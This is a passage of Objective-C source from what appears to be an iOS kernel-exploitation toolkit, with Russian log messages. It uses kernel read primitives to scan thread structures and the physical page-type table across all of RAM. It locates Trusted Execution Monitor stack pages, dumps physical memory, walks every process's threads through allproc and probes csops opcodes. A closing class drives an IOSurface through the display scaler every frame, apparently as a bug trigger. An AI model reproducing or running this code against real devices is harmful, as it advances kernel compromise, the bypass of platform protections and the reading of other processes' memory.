            int t = kpVAType(va, tableVA);
            NSString *tag = @"";
            if (t == 0x2a) { tag = @" ← КАНДИДАТ TXM STACK (type 0x2a)"; txmOff = (int)o; }
            kpNote(r, [NSString stringWithFormat:@"    +0x%03x: %#llx type=%@%@",
                      o, (unsigned long long)va,
                      t < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", t], tag]);
        }
    }

    // 6. csops forces a TXM round-trip on this thread — rescan for NEW kernel
    //    VAs (the TXM stack is associated lazily on the first TXM call).
    kpNote(r, @"  csops(self, CS_OPS_STATUS) — форсирую TXM-вызов на этом треде…");
    extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
    uint32_t csbuf[4] = {0};
    int csres = csops(getpid(), 0, csbuf, sizeof(csbuf));
    kpNote(r, [NSString stringWithFormat:@"  csops → %d (flags=0x%x) — повторный скан thread_t", csres, csbuf[0]]);
    memset(tbuf, 0, tsz);
    if (kpRead(threadVA, tbuf, tsz, "thread_t dump #2", r)) {
        int newCnt = 0;
        for (uint32_t o = 0; o + 8 <= tsz; o += 8) {
            uint64_t q = 0;
            memcpy(&q, tbuf + o, 8);
            uint64_t va = kp_untag_ptr(q);
            if (!kpLooksLikeKernelPointer(va)) continue;
            if ([before containsObject:@(va)]) continue;
            int t = kpVAType(va, tableVA);
            NSString *tag = @"";
            if (t == 0x2a) { tag = @" ← TXM STACK (type 0x2a, появился после csops)"; txmOff = (int)o; }
            kpNote(r, [NSString stringWithFormat:@"    NEW +0x%03x: %#llx type=%@%@",
                      o, (unsigned long long)va,
                      t < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", t], tag]);
            newCnt++;
        }
        if (!newCnt) kpNote(r, @"    новых kernel VA после csops нет (TXM stack либо уже был, либо вызов не дошёл до TXM)");
    }
    free(tbuf);

    // 7. Whole-RAM type sweep + TXM-cluster hunt: collect PAs of all pages
    //    typed 38..62 (TXM/SK domains), then dense-scan ±512 FTE around each
    //    for the elusive 0x2a (TXM stack).
    [r appendString:@"\n  --- развёртка всей RAM (каждая 64-я страница) ---\n"];
    NSMutableArray<NSNumber *> *txmPAs = [NSMutableArray array];
    {
        uint64_t totalPages = kconstant(physSize) >> 14;
        uint64_t samples = totalPages / 64;
        NSCountedSet *hist = [NSCountedSet set];
        int t0 = 0, t2a = 0;
        for (uint64_t i = 0; i < samples; i++) {
            uint64_t fte = tableVA + (i * 64) * 16;
            uint8_t ent[16];
            memset(ent, 0, sizeof(ent));
            kreadbuf(fte, ent, 16);
            [hist addObject:@(ent[2])];
            uint64_t pa = kconstant(physBase) + (i * 64) * 0x4000;
            if (ent[2] >= 38 && ent[2] <= 62) [txmPAs addObject:@(pa)];
            if (ent[2] == 0 && t0 < 12) {
                t0++;
                kpNote(r, [NSString stringWithFormat:@"    ТИП 0 @ PA=%#llx FTE: guard=%04x level=%u owner=%02x",
                          (unsigned long long)pa, ent[0] | (ent[1] << 8), ent[4], ent[8]]);
            }
            if (ent[2] == 0x2a && t2a < 12) {
                t2a++;
                kpNote(r, [NSString stringWithFormat:@"    ТИП 0x2a (TXM stack) @ PA=%#llx FTE: guard=%04x level=%u owner=%02x",
                          (unsigned long long)pa, ent[0] | (ent[1] << 8), ent[4], ent[8]]);
            }
        }
        NSMutableArray *parts = [NSMutableArray array];
        for (NSNumber *t in [[hist allObjects] sortedArrayUsingSelector:@selector(compare:)])
            [parts addObject:[NSString stringWithFormat:@"0x%02x×%lu", t.unsignedCharValue, (unsigned long)[hist countForObject:t]]];
        kpNote(r, [NSString stringWithFormat:@"  гистограмма всей RAM (%llu сэмплов): %@", (unsigned long long)samples, [parts componentsJoinedByString:@" "]]);
        kpNote(r, [NSString stringWithFormat:@"  тип 0: %d показано · тип 0x2a: %d показано · TXM/SK-страниц (38-62): %lu", t0, t2a, (unsigned long)txmPAs.count]);
    }

    // 7b. Dense scan around every TXM/SK-typed page.
    NSMutableArray<NSNumber *> *stack2aPAs = [NSMutableArray array];
    if (txmPAs.count) {
        kpNote(r, [NSString stringWithFormat:@"  --- доскан ±512 FTE вокруг %lu TXM/SK страниц на 0x2a ---", (unsigned long)txmPAs.count]);
        int found2a = 0;
        for (NSNumber *paNum in txmPAs) {
            uint64_t pa = paNum.unsignedLongLongValue;
            uint64_t center = (pa - kconstant(physBase)) >> 14;
            NSCountedSet *local = [NSCountedSet set];
            for (int64_t d = -512; d <= 512; d++) {
                int64_t idx = (int64_t)center + d;
                if (idx < 0) continue;
                uint8_t ent[16];
                memset(ent, 0, sizeof(ent));
                kreadbuf(tableVA + (uint64_t)idx * 16, ent, 16);
                [local addObject:@(ent[2])];
                if (ent[2] == 0x2a && found2a < 16) {
                    found2a++;
                    uint64_t fpa = kconstant(physBase) + (uint64_t)idx * 0x4000;
                    if (stack2aPAs.count < 8) [stack2aPAs addObject:@(fpa)];
                    kpNote(r, [NSString stringWithFormat:@"    0x2a НАЙДЕНА @ PA=%#llx (кластер около PA=%#llx): guard=%04x level=%u owner=%02x",
                              (unsigned long long)fpa, (unsigned long long)pa, ent[0] | (ent[1] << 8), ent[4], ent[8]]);
                }
            }
            NSMutableArray *lp = [NSMutableArray array];
            for (NSNumber *t in [[local allObjects] sortedArrayUsingSelector:@selector(compare:)])
                [lp addObject:[NSString stringWithFormat:@"0x%02x×%lu", t.unsignedCharValue, (unsigned long)[local countForObject:t]]];
            kpNote(r, [NSString stringWithFormat:@"    кластер PA=%#llx: %@", (unsigned long long)pa, [lp componentsJoinedByString:@" "]]);
        }
        kpNote(r, [NSString stringWithFormat:@"  доскан: страниц 0x2a найдено: %d", found2a]);
    }

    // 7c. Dump the TXM stack pages themselves (physmap read — reads don't fault).
    for (NSNumber *paNum in stack2aPAs) {
        uint64_t pa = paNum.unsignedLongLongValue;
        uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
        if (!kva) continue;
        uint8_t sb[0x100];
        memset(sb, 0, sizeof(sb));
        if (!kpRead(kva, sb, sizeof(sb), "txm stack dump", r)) continue;
        int nz = 0;
        for (uint32_t o = 0; o + 8 <= sizeof(sb); o += 8) {
            uint64_t q = 0;
            memcpy(&q, sb + o, 8);
            if (q) {
                nz++;
                kpNote(r, [NSString stringWithFormat:@"    0x2a PA=%#llx +0x%02x: %#018llx",
                          (unsigned long long)pa, o, (unsigned long long)q]);
            }
        }
        if (!nz) kpNote(r, [NSString stringWithFormat:@"    0x2a PA=%#llx: первые 0x100 байт нулевые (стек свободен/очищен)", (unsigned long long)pa]);
    }

    // 8. ALL our threads via task_threads: read thread+0x530 (TXM
    //    association, from txm_kernel_call_internal @ 0x8502ce0) and +0x4a0
    //    (CAS token) of each. Also empirically locate task->threads by
    //    finding a queue head in task pointing into a known thread_t.
    [r appendString:@"\n  --- все наши треды: поле +0x530 (TXM association) ---\n"];
    {
        thread_act_array_t actList = NULL;
        mach_msg_type_number_t actCount = 0;
        kern_return_t kr = task_threads(mach_task_self(), &actList, &actCount);
        if (kr != KERN_SUCCESS || !actList) {
            kpNote(r, [NSString stringWithFormat:@"  task_threads failed: %d", kr]);
        } else {
            kpNote(r, [NSString stringWithFormat:@"  тредов в процессе: %u", (unsigned)actCount]);
            uint64_t firstThreadVA = 0;
            for (mach_msg_type_number_t i = 0; i < actCount; i++) {
                mach_port_t tp = actList[i];
                uint64_t eVA = table + (uint64_t)sizeof_ipc_entry * (tp >> 8);
                uint64_t oRaw = 0, kRaw = 0;
                if (!kpRead(eVA + off_ipc_entry_ie_object, &oRaw, 8, "thr ie_object", r)) continue;
                uint64_t pVA = kp_untag_ptr(oRaw);
                if (!kpLooksLikeKernelPointer(pVA)) continue;
                if (!kpRead(pVA + off_ipc_port_ip_kobject, &kRaw, 8, "thr ip_kobject", r)) continue;
                uint64_t tVA = kp_untag_ptr(kRaw);
                if (!kpLooksLikeKernelPointer(tVA)) continue;
                if (!firstThreadVA) firstThreadVA = tVA;
                uint64_t assoc = 0;
                uint32_t casTok = 0;
                kreadbuf(tVA + 0x530, &assoc, 8);
                kreadbuf(tVA + 0x4a0, &casTok, 4);
                uint64_t assocU = kp_untag_ptr(assoc);
                int tAssoc = kpLooksLikeKernelPointer(assocU) ? kpVAType(assocU, tableVA) : -1;
                kpNote(r, [NSString stringWithFormat:@"    thread[%u] port=%#x thread_t=%#llx +0x530=%#llx%@ casTok=%#x",
                          (unsigned)i, (unsigned)tp, (unsigned long long)tVA, (unsigned long long)assoc,
                          assoc ? [NSString stringWithFormat:@" (untag %#llx type=%@)", (unsigned long long)assocU,
                                   tAssoc < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tAssoc]] : @"",
                          (unsigned)casTok]);
            }
            // task->threads empirical: qword in task pointing into firstThreadVA..+0x1000
            if (firstThreadVA) {
                uint32_t tsz2 = 0x800;
                uint8_t *tb = malloc(tsz2);
                memset(tb, 0, tsz2);
                if (kpRead(selfTask, tb, tsz2, "task scan for threads queue", r)) {
                    for (uint32_t o = 0; o + 16 <= tsz2; o += 8) {
                        uint64_t q = 0;
                        memcpy(&q, tb + o, 8);
                        uint64_t va = kp_untag_ptr(q);
                        if (va >= firstThreadVA && va < firstThreadVA + 0x1000) {
                            kpNote(r, [NSString stringWithFormat:@"    task+%#x: %#llx → внутри thread_t[0] (+%#llx) — кандидат threads queue (link offset +%#llx)",
                                      o, (unsigned long long)va, (unsigned long long)(va - firstThreadVA), (unsigned long long)(va - firstThreadVA)]);
                        }
                    }
                }
                free(tb);
            }
            for (mach_msg_type_number_t i = 0; i < actCount; i++)
                mach_port_deallocate(mach_task_self(), actList[i]);
            vm_deallocate(mach_task_self(), (vm_address_t)actList, actCount * sizeof(mach_port_t));
        }
    }

    [r appendFormat:@"\n=== D1 ИТОГ: txm stack offset в thread_t = %@ ===\n",
        txmOff >= 0 ? [NSString stringWithFormat:@"0x%x (type 0x2a подтверждён)", txmOff]
                    : @"не найден (см. скан выше; если type 0x2a нет — TXM stack не ассоциирован с этим тредом)"];

    // 9. csops variants: read-only-ish opcodes that might route through TXM.
    [r appendString:@"\n  --- csops-варианты: какой opcode драйвит TXM? ---\n"];
    {
        static const struct { unsigned int op; const char *name; uint32_t bufsz; } variants[] = {
            { 5,  "CS_OPS_CDHASH", 20 },
            { 7,  "CS_OPS_ENTITLEMENTS_BLOB", 4096 },
            { 8,  "op 8", 4096 },
            { 9,  "op 9", 64 },
            { 10, "op 10", 64 },
        };
        for (int v = 0; v < 5; v++) {
            uint8_t *vbuf = calloc(1, variants[v].bufsz);
            int vres = csops(getpid(), variants[v].op, vbuf, variants[v].bufsz);
            uint64_t assoc = 0;
            kreadbuf(threadVA + 0x530, &assoc, 8);
            kpNote(r, [NSString stringWithFormat:@"    csops(%s) → %d · наш +0x530 после: %#llx%@",
                      variants[v].name, vres, (unsigned long long)assoc,
                      assoc ? @"  ← АССОЦИАЦИЯ ПОЯВИЛАСЬ!" : @""]);
            free(vbuf);
            if (assoc) break;
        }
    }

    // 10. Cross-process hunt for a LIVE association (+0x530 != 0) in any
    //     thread of any process. task->threads offset is found empirically:
    //     a qword in our task pointing at one of our thread_ts (or its +0x3c8
    //     link — from the thread scan, +0x3c8/+0x3d0 are next/prev by object).
    [r appendString:@"\n  --- скан всех процессов: живые TXM-ассоциации ---\n"];
    {
        uint64_t ourTVAs[8]; int nOur = 0;
        {
            thread_act_array_t al2 = NULL;
            mach_msg_type_number_t ac2 = 0;
            if (task_threads(mach_task_self(), &al2, &ac2) == KERN_SUCCESS && al2) {
                for (mach_msg_type_number_t i = 0; i < ac2 && nOur < 8; i++) {
                    uint64_t eVA = table + (uint64_t)sizeof_ipc_entry * (al2[i] >> 8);
                    uint64_t oRaw = 0, kRaw = 0;
                    if (!kpRead(eVA + off_ipc_entry_ie_object, &oRaw, 8, "t2 ie_object", r)) continue;
                    uint64_t pVA = kp_untag_ptr(oRaw);
                    if (!kpLooksLikeKernelPointer(pVA)) continue;
                    if (!kpRead(pVA + off_ipc_port_ip_kobject, &kRaw, 8, "t2 ip_kobject", r)) continue;
                    uint64_t tVA = kp_untag_ptr(kRaw);
                    if (kpLooksLikeKernelPointer(tVA)) ourTVAs[nOur++] = tVA;
                }
                for (mach_msg_type_number_t i = 0; i < ac2; i++) mach_port_deallocate(mach_task_self(), al2[i]);
                vm_deallocate(mach_task_self(), (vm_address_t)al2, ac2 * sizeof(mach_port_t));
            }
        }
        int threadsHeadOff = -1;
        {
            uint8_t tb2[0x400];
            memset(tb2, 0, sizeof(tb2));
            if (kpRead(selfTask, tb2, sizeof(tb2), "task threads probe", r)) {
                for (uint32_t o = 0; o + 8 <= sizeof(tb2) && threadsHeadOff < 0; o += 8) {
                    uint64_t q = 0;
                    memcpy(&q, tb2 + o, 8);
                    uint64_t va = kp_untag_ptr(q);
                    for (int i = 0; i < nOur; i++) {
                        if (va == ourTVAs[i] || va == ourTVAs[i] + 0x3c8) {
                            threadsHeadOff = (int)o;
                            kpNote(r, [NSString stringWithFormat:@"    task->threads head @ task+%#x → %#llx (link по +%#llx)",
                                      o, (unsigned long long)va, (unsigned long long)(va - ourTVAs[i])]);
                            break;
                        }
                    }
                }
            }
        }
        if (threadsHeadOff < 0) {
            kpNote(r, @"    task->threads не найден эмпирически — скан чужих процессов пропущен");
        } else {
            uint64_t sym2 = ksymbol(allproc);
            uint64_t head2 = 0;
            kpRead(sym2, &head2, sizeof(head2), "allproc head", r);
            head2 = kp_untag_ptr(head2);
            int procsScanned = 0, threadsScanned = 0, assocFound = 0;
            uint64_t node2 = head2, prev2 = 0;
            for (int n = 0; n < 1536 && kpLooksLikeKernelPointer(node2) && node2 != prev2; n++) {
                uint64_t pr = 0, tk = 0, th = 0;
                if (!kpRead(node2 + koffsetof(proc, proc_ro), &pr, 8, "xp proc_ro", r)) break;
                pr = kp_untag_ptr(pr);
                if (!kpLooksLikeKernelPointer(pr)) goto nextProc;
                if (!kpRead(pr + off_proc_ro_pr_task, &tk, 8, "xp task", r)) goto nextProc;
                tk = kp_untag_ptr(tk);
                if (!kpLooksLikeKernelPointer(tk)) goto nextProc;
                if (!kpRead(tk + threadsHeadOff, &th, 8, "xp threads head", r)) goto nextProc;
                th = kp_untag_ptr(th);
                {
                    char pname[17] = {0};
                    kreadbuf(node2 + off_proc_p_name, pname, 16);
                    uint64_t tcur = th, tprev = 0;
                    for (int t = 0; t < 64 && kpLooksLikeKernelPointer(tcur) && tcur != tprev; t++) {
                        uint64_t assoc = 0;
                        kreadbuf(tcur + 0x530, &assoc, 8);
                        threadsScanned++;
                        if (assoc) {
                            assocFound++;
                            uint64_t assocU = kp_untag_ptr(assoc);
                            int tA = kpLooksLikeKernelPointer(assocU) ? kpVAType(assocU, tableVA) : -1;
                            kpNote(r, [NSString stringWithFormat:@"    АССОЦИАЦИЯ [%s] thread_t=%#llx +0x530=%#llx (untag %#llx type=%@)",
                                      pname, (unsigned long long)tcur, (unsigned long long)assoc,
                                      (unsigned long long)assocU,
                                      tA < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tA]]);
                            if (kpLooksLikeKernelPointer(assocU)) {
                                uint8_t ab[0x80];
                                memset(ab, 0, sizeof(ab));
                                if (kpRead(assocU, ab, sizeof(ab), "assoc struct dump", r)) {
                                    for (uint32_t o = 0; o + 8 <= sizeof(ab); o += 8) {
                                        uint64_t q = 0;
                                        memcpy(&q, ab + o, 8);
                                        if (q) kpNote(r, [NSString stringWithFormat:@"      assoc+0x%02x: %#018llx", o, (unsigned long long)q]);
                                    }
                                }
                            }
                        }
                        uint64_t nxt = 0;
                        kreadbuf(tcur + 0x3c8, &nxt, 8);
                        tprev = tcur;
                        tcur = kp_untag_ptr(nxt);
                        if (tcur == th || tcur == tk + threadsHeadOff) break;
                    }
                }
            nextProc:
                procsScanned++;
                uint64_t nxt2 = 0;
                kreadbuf(node2, &nxt2, sizeof(nxt2));
                prev2 = node2;
                node2 = kp_untag_ptr(nxt2);
            }
            kpNote(r, [NSString stringWithFormat:@"    скан: %d процессов, %d тредов, живых ассоциаций: %d",
                      procsScanned, threadsScanned, assocFound]);
        }
    }
    return r;
}

@end

@implementation KPM2ScalerTrigger

- (void)startWithSurface:(IOSurfaceRef)surface {
    self.surface = surface;
    UIWindow *window = nil;
    for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
        if ([scene isKindOfClass:[UIWindowScene class]] &&
            scene.activationState != UISceneActivationStateUnattached) {
            window = ((UIWindowScene *)scene).windows.firstObject;
            if (window) break;
        }
    }
    if (!window) return;

    self.view = [[UIView alloc] initWithFrame:CGRectMake(window.bounds.size.width - 72, 40, 64, 64)];
    self.view.userInteractionEnabled = NO;
    // contentsGravity=resize + 32x32 → 64x64: scaler обязан работать каждый кадр.
    self.view.layer.contentsGravity = kCAGravityResize;
    self.view.layer.magnificationFilter = kCAFilterLinear;
    self.view.layer.contents = (__bridge id)surface;
    [window addSubview:self.view];

    self.link = [CADisplayLink displayLinkWithTarget:self selector:@selector(tick:)];
    if (@available(iOS 15.0, *)) {
        self.link.preferredFrameRateRange = CAFrameRateRangeMake(30, 120, 120);
    }
    [self.link addToRunLoop:[NSRunLoop mainRunLoop] forMode:NSRunLoopCommonModes];
}

- (void)tick:(CADisplayLink *)link {
    self.frame++;
    IOSurfaceRef s = self.surface;
    if (!s) return;
    // Переписываем пиксели: compositor не может закешировать кадр.
    if (IOSurfaceLock(s, 0, NULL) == kIOReturnSuccess) {
        uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(s);
        size_t bpr = IOSurfaceGetBytesPerRow(s);
        for (uint32_t y = 0; y < 32; y++) {
            uint32_t *row = (uint32_t *)(base + y * bpr);
            for (uint32_t x = 0; x < 32; x++) {
                row[x] = 0xFF000000u | (((self.frame + x) & 0xFF) << 16)
                       | ((y & 0xFF) << 8) | ((self.frame >> 1) & 0xFF);
            }
        }
        IOSurfaceUnlock(s, 0, NULL);
    }
    // Переназначение contents заставляет compositor заново взять поверхность.
    self.view.layer.contents = nil;
    self.view.layer.contents = (__bridge id)s;
}

- (void)stop {
    [self.link invalidate];
    self.link = nil;
    [self.view removeFromSuperview];
    self.view = nil;
}

@end
